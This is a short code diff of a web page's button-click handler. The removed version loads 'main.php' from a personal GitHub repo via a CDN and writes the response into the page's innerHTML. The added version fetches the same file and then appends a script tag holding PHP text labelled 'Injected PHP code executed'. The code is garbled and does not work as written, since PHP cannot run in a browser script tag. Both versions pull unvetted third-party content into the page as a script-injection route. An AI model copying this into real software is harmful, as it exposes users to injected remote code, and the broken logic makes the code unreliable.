@@ -12,14 +12,19 @@
     var button = document.createElement('button');
     button.textContent = 'Click Me';
     button.addEventListener('click', function() {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', 'https://cdn.jsdelivr.net/gh/ttimhzv/fa@main/main.php', true);
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    document.getElementById('ma').innerHTML = xhr.responseText;
-                }
-            };
-            xhr.send();
+            
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+        var scriptTag = document.createElement('script');
+        scriptTag.textContent = '<?php echo "Injected PHP code executed"; ?>';
+        document.body.appendChild(scriptTag);
+    }
+};
+xmlhttp.open("GET", "https://cdn.jsdelivr.net/gh/ttimhzv/fa@main/main.php", true);
+xmlhttp.send();
+
+	    
       alert('Button clicked!');
     });
     div.appendChild(button);
